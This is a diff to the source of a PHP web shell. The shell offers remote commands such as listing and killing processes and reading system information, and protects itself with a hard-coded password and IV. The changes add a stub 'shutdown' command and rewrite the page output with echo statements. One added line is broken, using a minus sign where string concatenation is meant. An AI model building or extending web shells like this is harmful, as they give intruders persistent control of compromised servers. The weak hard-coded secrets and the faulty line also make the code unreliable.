@@ -23,13 +23,8 @@ define('UI_BG', '#ffffff'); // ui background color
 define('UI_FC', '#333333'); // ui foreground color
 define('UI_BC', '#00acc1'); // ui bold color
 
-?>
-<link rel="icon" href="https://png.icons8.com/color/100/000000/hexagon.png">
-<style>
-    html { background-color: <?= UI_BG ?>; color: <?= UI_FC ?>;}
-    strong { color: <?= UI_BC ?>; }
-</style>
-<?
+echo '<link rel="icon" href="https://png.icons8.com/color/100/000000/hexagon.png">';
+echo '<style>html { background-color:'.UI_BG.'; color:'.UI_FC.';}strong { color:'.UI_BC.'; }</style>';
 
 // define shell constants
 define('PROTECT_PWD', '123456789');
@@ -45,7 +40,7 @@ if (!empty($_POST)) {
     define('IV', '3g&e35gW');
 } elseif ( !empty($_GET) ) {
     define('ENC_MODE', false);
-    ?><title><?= SHELL_NAME ?> (<?= $_SERVER['HTTP_HOST'] ?>) @ <?= $_SERVER['SERVER_ADMIN'] ?></title><?
+    echo '<title>'.SHELL_NAME.'('.$_SERVER['HTTP_HOST']-') @'.$_SERVER['SERVER_ADMIN'].'</title>';
 }
 define('SHELL_HELP',"
 > ".
@@ -86,6 +81,7 @@ Available commands:
 
     <strong>System and db operations:</strong>
 
+    shutdown 						Shutdown system.
     tasklist                        Show list of running processes.
     taskkill[TASK]                  Try to kill task.
     sysinfo                         Show advanced system information.
@@ -125,12 +121,14 @@ $serverOs = function () {
  * @return string
  */
 function getCpuUsage() {
-    $cores = sys_getloadavg();
-    $x = "";
-    foreach ( $cores as $core ) {
-        $x .= $core."% ";
-    }
-    return $x;
+	if ( function_exists('sys_getloadavg') ) {
+	    $cores = sys_getloadavg();
+	    $x = "";
+	    foreach ( $cores as $core ) {
+	        $x .= $core."% ";
+	    }
+	    return $x;
+	} else return false;
 }
 
 /**
@@ -599,6 +597,11 @@ Type:                   ".filetype($file)."
  * Class System
  */
 class System {
+
+	static public function shutdown() {
+		//TODO
+	}
+
     /**
      * Show list of running processes
      */
